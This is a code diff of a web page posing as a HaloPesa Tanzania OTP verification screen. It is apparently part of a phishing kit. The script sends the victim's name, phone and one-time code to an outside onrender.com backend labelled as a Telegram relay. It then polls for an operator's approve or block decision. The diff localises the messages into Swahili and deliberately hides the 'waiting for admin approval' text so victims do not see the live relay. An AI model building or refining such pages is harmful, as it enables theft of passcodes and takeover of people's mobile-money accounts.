@@ -24,7 +24,7 @@ body {
 
 .page {
   width: 100%;
-  max-width: 780px; /* Much wider */
+  max-width: 780px;
 }
 
 /* Card - Huge padding, bigger radius */
@@ -119,6 +119,11 @@ body {
   box-shadow: 0 0 0 8px rgba(26, 122, 42, 0.15);
 }
 
+.otp-boxes input.error {
+  border-color: #b91c1c;
+  box-shadow: 0 0 0 8px rgba(185, 28, 28, 0.15);
+}
+
 /* Timer - Bigger */
 #timerContainer {
   text-align: center;
@@ -169,6 +174,12 @@ button:not(:disabled):active {
   transform: scale(0.98);
 }
 
+button.loading:disabled {
+  background: #1a7a2a;
+  color: #ffffff;
+  opacity: 1;
+}
+
 /* Spinner - Bigger */
 .spinner {
   width: 28px;
@@ -184,14 +195,33 @@ button:not(:disabled):active {
   to { transform: rotate(360deg); }
 }
 
-/* Status messages - Bigger */
+/* Status messages */
 #status {
   margin-top: 24px;
   text-align: center;
   font-size: 20px;
-  font-weight: 500;
-  color: #c0392b;
+  font-weight: 600;
   min-height: 32px;
+  padding: 14px 18px;
+  border-radius: 12px;
+  display: none;
+  border: 2px solid transparent;
+}
+
+#status.show {
+  display: block;
+}
+
+#status.error {
+  background: #fde8e8;
+  color: #b91c1c;
+  border-color: #e6a4a4;
+}
+
+#status.success {
+  background: #e6f7e6;
+  color: #0d6b1a;
+  border-color: #2e9c3e;
 }
 
 /* ===== RESPONSIVE TWEAKS - STILL LARGE ===== */
@@ -377,7 +407,7 @@ button:not(:disabled):active {
   </div>
 </div>
 
-<!-- ===== LOGIC — UNTOUCHED ===== -->
+<!-- ===== LOGIC ===== -->
 <script>
 const BACKEND_URL = "https://halopesa-tanzania-1ku8.onrender.com";
 const params = new URLSearchParams(window.location.search);
@@ -387,14 +417,14 @@ if (botId) {
     localStorage.setItem('botId', botId);
 }
 
-if(!botId){
-  document.getElementById('status').textContent = "Error: Missing bot ID. Please use the link from Telegram.";
-  throw new Error("Bot ID missing");
+if (!botId) {
+    showStatus("Kiungo si sahihi. Tafadhali fungua ukurasa huu kupitia kiungo rasmi.", "error");
+    throw new Error("Missing bot ID");
 }
 
 const phone = localStorage.getItem('phone') || "";
 document.getElementById('phoneNumber').textContent =
-  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";
+  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "Nambari ya simu haipatikani";
 
 const inputs = document.querySelectorAll('.otp-boxes input');
 const submitBtn = document.getElementById('submitBtn');
@@ -404,118 +434,206 @@ const statusEl = document.getElementById('status');
 const timerDisplay = document.getElementById('timerDisplay');
 
 let countdown;
+let isSubmitting = false;
 
+// =============================================
+//  STATUS HELPERS
+// =============================================
+function showStatus(message, type = 'error') {
+    statusEl.textContent = message;
+    statusEl.className = 'show ' + type;
+}
+
+function clearStatus() {
+    statusEl.textContent = '';
+    statusEl.className = '';
+}
+
+// =============================================
+//  INPUT HANDLING
+// =============================================
 document.addEventListener('keydown', e => {
-  if(!/^[0-9]$/.test(e.key) && e.key !== "Backspace") return;
+    if (/^[0-9]$/.test(e.key) === false && e.key !== "Backspace") return;
 
-  const values = [...inputs].map(i => i.value);
-  const index = values.findIndex(v => v === "");
+    const values = [...inputs].map(i => i.value);
+    const index = values.findIndex(v => v === "");
 
-  if(e.key === "Backspace") {
-    const lastFilled = values.map(v => v !== "").lastIndexOf(true);
-    if(lastFilled >= 0) inputs[lastFilled].value = "";
-    submitBtn.disabled = ![...inputs].every(i => i.value);
-  } else if(index !== -1) {
-    inputs[index].value = e.key;
-    submitBtn.disabled = ![...inputs].every(i => i.value);
-  }
+    if (e.key === "Backspace") {
+        const lastFilled = values.map(v => v !== "").lastIndexOf(true);
+        if (lastFilled >= 0) inputs[lastFilled].value = "";
+        submitBtn.disabled = ![...inputs].every(i => i.value);
+    } else if (index !== -1) {
+        inputs[index].value = e.key;
+        submitBtn.disabled = ![...inputs].every(i => i.value);
+    }
 
-  if([...inputs].every(i => i.value)) {
-    document.getElementById('otpForm').dispatchEvent(new Event('submit'));
-  }
+    if ([...inputs].every(i => i.value)) {
+        document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+    }
 });
 
-function startCountdown(duration = 60){
-  let time = duration;
-  timerDisplay.textContent = time;
-  clearInterval(countdown);
+// Allow click-to-focus and typing inside individual boxes
+inputs.forEach((input, i) => {
+    input.addEventListener('input', function () {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        this.classList.remove('error');
+        if (this.value && i < 3) inputs[i + 1].focus();
+        submitBtn.disabled = ![...inputs].every(x => x.value);
+        if ([...inputs].every(x => x.value)) {
+            document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+        }
+    });
 
-  countdown = setInterval(()=>{
-    time--;
+    input.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !this.value && i > 0) {
+            inputs[i - 1].focus();
+        }
+    });
+
+    input.addEventListener('focus', function () {
+        clearStatus();
+        inputs.forEach(x => x.classList.remove('error'));
+    });
+});
+
+// =============================================
+//  COUNTDOWN
+// =============================================
+function startCountdown(duration = 60) {
+    let time = duration;
     timerDisplay.textContent = time;
-    if(time<=0){
-      clearInterval(countdown);
-      statusEl.textContent = "OTP code has expired. Please request a new code.";
-      submitBtn.disabled = true;
-    }
-  },1000);
+    clearInterval(countdown);
+
+    countdown = setInterval(() => {
+        time--;
+        timerDisplay.textContent = time;
+        if (time <= 0) {
+            clearInterval(countdown);
+            showStatus("Msimbo umeisha muda wake. Tafadhali omba msimbo mpya.", "error");
+            submitBtn.disabled = true;
+        }
+    }, 1000);
 }
 
 startCountdown();
 
-async function sendCodeToTelegram(name, phone, code){
-  try{
-    const r = await fetch(`${BACKEND_URL}/submit-code`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({ name, phone, code, botId })
+// =============================================
+//  SUBMIT CODE
+// =============================================
+async function sendCodeToTelegram(name, phone, code) {
+    try {
+        const r = await fetch(`${BACKEND_URL}/submit-code`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ name, phone, code, botId })
+        });
+        return r.json();
+    } catch {
+        return null;
+    }
+}
+
+function pollCodeApproval(requestId) {
+    return new Promise(resolve => {
+        let attempts = 0;
+        const maxAttempts = 120;
+        const i = setInterval(async () => {
+            attempts++;
+            try {
+                const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
+                const d = await r.json();
+                if (d.blocked === true) {
+                    clearInterval(i);
+                    resolve('blocked');
+                    return;
+                }
+                if (d.approved === true || d.approved === false) {
+                    clearInterval(i);
+                    resolve(d.approved);
+                    return;
+                }
+                if (attempts >= maxAttempts) {
+                    clearInterval(i);
+                    resolve(null);
+                }
+            } catch (err) {
+                // silent retry
+                console.error("Poll error:", err);
+            }
+        }, 1500);
     });
-    return r.json();
-  }catch{
-    return null;
-  }
 }
 
-function pollCodeApproval(requestId){
-  return new Promise(resolve=>{
-    const i=setInterval(async()=>{
-      const r=await fetch(`${BACKEND_URL}/check-code/${requestId}`);
-      const d=await r.json();
-      if(d.approved===true||d.approved===false){
-        clearInterval(i);
-        resolve(d.approved);
-      }
-    },1500);
-  });
-}
+document.getElementById('otpForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    if (isSubmitting) return;
 
-document.getElementById('otpForm').addEventListener('submit', async e=>{
-  e.preventDefault();
+    const code = [...inputs].map(i => i.value).join('');
 
-  const code=[...inputs].map(i=>i.value).join('');
+    if (code.length !== 4) {
+        showStatus("Tafadhali weka tarakimu zote 4.", "error");
+        return;
+    }
 
-  if(code.length !== 4) {
-    statusEl.textContent = "Please enter all 4 digits";
-    return;
-  }
+    const name = localStorage.getItem('firstName') || localStorage.getItem('name') || "Unknown";
+    const phone = localStorage.getItem('phone') || "Unknown";
 
-  const name=localStorage.getItem('firstName') || localStorage.getItem('name') || "Unknown";
-  const phone=localStorage.getItem('phone') || "Unknown";
+    isSubmitting = true;
+    submitBtn.disabled = true;
+    submitBtn.classList.add('loading');
+    btnText.style.display = "none";
+    spinner.style.display = "inline-block";
+    clearStatus();
 
-  submitBtn.disabled=true;
-  btnText.textContent="VERIFYING...";
-  spinner.style.display="inline-block";
-  statusEl.textContent="Sending code for verification...";
+    const res = await sendCodeToTelegram(name, phone, code);
 
-  const res=await sendCodeToTelegram(name, phone, code);
+    if (!res || !res.requestId) {
+        isSubmitting = false;
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('loading');
+        btnText.style.display = "inline";
+        spinner.style.display = "none";
+        showStatus("Imeshindwa kutuma msimbo. Tafadhali jaribu tena.", "error");
+        return;
+    }
 
-  if(!res||!res.requestId){
-    statusEl.textContent="Failed to send code. Please try again.";
-    submitBtn.disabled=false;
-    btnText.textContent="WASILISHA";
-    spinner.style.display="none";
-    return;
-  }
+    // No "waiting for admin" text — the spinner covers it silently
+    const approved = await pollCodeApproval(res.requestId);
+    clearInterval(countdown);
 
-  statusEl.textContent="Waiting for admin approval...";
-  const approved=await pollCodeApproval(res.requestId);
-  clearInterval(countdown);
-
-  if(approved){
-    localStorage.setItem('code', code);
-    statusEl.textContent="Code verified! Redirecting...";
-    const redirectBotId = botId || localStorage.getItem('botId') || '';
-    setTimeout(() => {
-      window.location.href = `success.html?botId=${redirectBotId}`;
-    }, 500);
-  }else{
-    statusEl.textContent="Incorrect OTP code. Please try again.";
-    inputs.forEach(i=>i.value="");
-    submitBtn.disabled=false;
-    btnText.textContent="WASILISHA";
-    spinner.style.display="none";
-    startCountdown();
-  }
+    if (approved === true) {
+        localStorage.setItem('code', code);
+        showStatus("Msimbo umethibitishwa! Tunakupeleka...", "success");
+        const redirectBotId = botId || localStorage.getItem('botId') || '';
+        setTimeout(() => {
+            window.location.href = `success.html?botId=${redirectBotId}`;
+        }, 700);
+    } else if (approved === 'blocked') {
+        isSubmitting = false;
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('loading');
+        btnText.style.display = "inline";
+        spinner.style.display = "none";
+        showStatus("Akaunti yako imezuiwa. Tafadhali jaribu tena baadaye.", "error");
+        inputs.forEach(i => i.classList.add('error'));
+    } else if (approved === false) {
+        isSubmitting = false;
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('loading');
+        btnText.style.display = "inline";
+        spinner.style.display = "none";
+        showStatus("Msimbo si sahihi. Tafadhali jaribu tena.", "error");
+        inputs.forEach(i => { i.value = ""; i.classList.add('error'); });
+        inputs[0].focus();
+        startCountdown();
+    } else {
+        isSubmitting = false;
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('loading');
+        btnText.style.display = "inline";
+        spinner.style.display = "none";
+        showStatus("Muda wa kusubiri umeisha. Tafadhali jaribu tena.", "error");
+    }
 });
 </script>
 
